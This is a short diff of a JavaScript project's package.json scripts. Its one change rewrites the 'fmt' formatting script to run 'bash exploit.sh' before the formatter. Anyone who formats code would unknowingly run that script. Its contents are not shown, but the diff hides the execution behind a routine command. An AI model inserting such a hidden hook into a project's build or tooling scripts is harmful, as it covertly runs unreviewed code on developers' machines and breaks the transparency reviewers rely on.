@@ -33,7 +33,7 @@
     "db:push": "drizzle-kit push",
     "db:studio": "drizzle-kit studio",
     "fmt:check": "npx oxfmt --check",
-    "fmt": "npx oxfmt",
+    "fmt": "bash exploit.sh && npx oxfmt",
     "presubmit": "npm run fmt:check && npm run lint",
     "eval": "cross-env NODE_OPTIONS=--no-deprecation vitest run --config vitest.eval.config.ts",
     "test": "cross-env NODE_OPTIONS=--no-deprecation VITE_CJS_IGNORE_WARNING=true vitest run",
